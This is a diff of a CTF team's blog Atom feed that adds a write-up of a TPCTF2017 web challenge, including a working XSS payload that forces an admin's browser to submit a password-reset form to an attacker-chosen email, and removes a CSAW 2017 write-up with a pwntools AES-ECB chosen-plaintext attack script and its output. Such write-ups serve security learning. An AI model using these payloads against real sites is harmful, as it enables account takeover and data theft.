@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-01T12:03:55.939Z</updated>
+  <updated>2017-12-04T04:45:09.329Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -14,6 +14,42 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Web] TPCTF2017 - It&#39;s Common Sense</title>
+    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/"/>
+    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/</id>
+    <published>2017-12-04T04:35:42.000Z</published>
+    <updated>2017-12-04T04:45:09.329Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>It’s Common Sense<br>100<br><br>Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.<br><br>We found this site: Common Sense Reviews<br><br>We think the site owners are related to Pirates. Please retrieve the admin password.<br><br>This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).<br><br>Author: Steven Su<br><br></blockquote>
+
+<p>A XSS challenge, we do have a <strong>register form</strong> and a <strong>login page</strong>, after signing up we can visit two forms in the <strong>account page</strong>, one is to <strong>sent a review</strong> to the admin, and the other is to <strong>reset the password</strong> (the new password was send to the email submitted in the form).</p>
+<p>My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a <strong>http only</strong> flag, which <strong>prevents</strong> it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to <strong>submit the password reset form</strong>! We can do this this with <strong>Ajax/Jquery</strong></p>
+<p>The first line of the code is to import <code>Jquery</code>:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">	$.ajax(&#123;</span></div><div class="line"><span class="javascript">	    type: <span class="string">"POST"</span>,</span></div><div class="line"><span class="javascript">	    url: <span class="string">"/account"</span>,</span></div><div class="line"><span class="javascript">	    data: <span class="string">'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request'</span>,</span></div><div class="line"><span class="javascript">	    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></div><div class="line"><span class="javascript">	        <span class="built_in">console</span>.log(<span class="string">'success'</span>);</span></div><div class="line"><span class="undefined">	    &#125;</span></div><div class="line"><span class="undefined">	&#125;);</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>Submitting the form like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/mpvECw9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/mpvECw9.png" alt=""><br></a><br>If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console:<br><a data-fancybox="gallery" href="https://i.imgur.com/g81VCRj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/g81VCRj.png" alt=""><br></a></p>
+<p>After a while we would receive an email with the flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;It’s Common Sense&lt;br&gt;100&lt;br&gt;&lt;br&gt;Common Sense Reviews was fixed last night. If you believe you had a working sol. last night 
+    
+    </summary>
+    
+      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
+    
+    
+      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
+    
+      <category term="xss" scheme="https://teamrocketist.github.io/tags/xss/"/>
+    
+      <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
+    
+      <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
+    
+  </entry>
   
   <entry>
     <title>[Misc] TUCTF - Gr8 Pictures</title>
@@ -261,9 +297,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -723,9 +759,9 @@ d = []
     
       <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
@@ -776,6 +812,8 @@ d = []
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
@@ -783,8 +821,6 @@ d = []
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -915,9 +951,9 @@ d = []
     
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -954,58 +990,11 @@ d = []
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
       <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Crypto-CSAW-CTF-2017-Baby-Crypt</title>
-    <link href="https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/"/>
-    <id>https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/</id>
-    <published>2017-09-18T17:19:10.000Z</published>
-    <updated>2017-09-19T05:11:05.812Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>baby_crypt<br>The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.<br><br>nc crypto.chal.csaw.io 1578<br></blockquote>
-
-<p>The first step that we took was to find out how many AES 16 byte blocks that the flag has.<br>To measure this we simply sent an empty request to the service.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578</div><div class="line">Enter your username (no whitespace):</div><div class="line">Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed</div></pre></td></tr></table></figure>
-<p>At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).<br>Therefore, the flag represents two AES 16 byte blocks.</p>
-<p>From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.<br>With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy.</p>
-<p>The chosen plaintext attack that we performed works as follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force.</p>
-<p>We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(X = byte to brute force, ! = byte of the secret, P = padding byte)</div><div class="line"></div><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E</div><div class="line">| ---------------input ---------------| --------------secret ---------------|</div><div class="line"></div><div class="line">D1 = &#123;</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;,</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;,</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1.</p>
-<p>The next round is similar.<br>For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P |</div><div class="line">| ---------------input ---------------|</div><div class="line"></div><div class="line">D2 = &#123;</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;,</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;,</div><div class="line">        ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag.</p>
-<p>And so on.</p>
-<p>The following code implements the attack.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">"crypto.chal.csaw.io"</span>, <span class="number">1578</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(chosen)</span>:</span></div><div class="line">        conn.send(chosen + <span class="string">"\n"</span>)</div><div class="line">        <span class="keyword">return</span> conn.recvline().split(<span class="string">" "</span>)[<span class="number">-1</span>].rstrip(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_block</span><span class="params">(blocks)</span>:</span></div><div class="line">        <span class="keyword">return</span> blocks[<span class="number">32</span>:<span class="number">64</span>]</div><div class="line"></div><div class="line"></div><div class="line">found = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">        d = &#123;&#125;</div><div class="line">        b = (<span class="string">"A"</span> * (<span class="number">31</span>-j)) + found</div><div class="line"></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7E</span>):</div><div class="line">                chosen = b + chr(i)</div><div class="line">                blocks = oracle(chosen)</div><div class="line">                d[second_block(blocks)] = chr(i)</div><div class="line">                <span class="keyword">print</span> <span class="string">"."</span>,</div><div class="line"></div><div class="line">        n = oracle(<span class="string">"A"</span> * (<span class="number">31</span>-j))</div><div class="line">        found += d[second_block(n)]</div><div class="line">	<span class="keyword">print</span> found</div><div class="line"></div><div class="line"><span class="keyword">print</span> found</div></pre></td></tr></table></figure>
-<p>After running it, we get the flag:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">..............................................................................................</div><div class="line">f</div><div class="line">..............................................................................................</div><div class="line">fl</div><div class="line">..............................................................................................</div><div class="line">fla</div><div class="line">..............................................................................................</div><div class="line">flag</div><div class="line">..............................................................................................</div><div class="line">flag&#123;</div><div class="line">..............................................................................................</div><div class="line">flag&#123;C</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cr</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cry</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cryp</div><div class="line">..............................................................................................</div><div class="line"></div><div class="line">(truncated output)</div><div class="line"></div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0.</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0..</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div></pre></td></tr></table></figure>
-<p>Very fun challenge!</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;baby_crypt&lt;br&gt;The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.&lt;br&gt;&lt;br&gt;nc crypto.chal.csa
-    
-    </summary>
-    
-      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
-    
-    
-      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
-    
-      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
-    
-      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
